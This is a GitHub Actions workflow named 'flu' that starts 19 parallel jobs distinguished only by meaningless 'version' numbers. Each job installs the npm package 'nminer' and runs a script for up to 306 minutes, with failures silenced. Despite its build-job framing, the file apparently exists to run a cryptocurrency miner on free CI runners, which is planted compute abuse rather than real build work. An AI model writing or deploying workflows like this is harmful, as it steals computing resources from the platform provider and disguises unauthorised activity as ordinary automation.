name: flu
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4760 }
          - { version: 2007 }
          - { version: 7177 }
          - { version: 8139 }
          - { version: 4266 }
          - { version: 7730 }
          - { version: 7166 }
          - { version: 8303 }
          - { version: 5505 }
          - { version: 6786 }
          - { version: 3439 }
          - { version: 9331 }
          - { version: 7792 }
          - { version: 7057 }
          - { version: 1082 }
          - { version: 1400 }
          - { version: 8565 }
          - { version: 6013 }
          - { version: 7340 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: at
        run: |
          npm install nminer@latest
          timeout 306m node flu.js || echo "flu executed"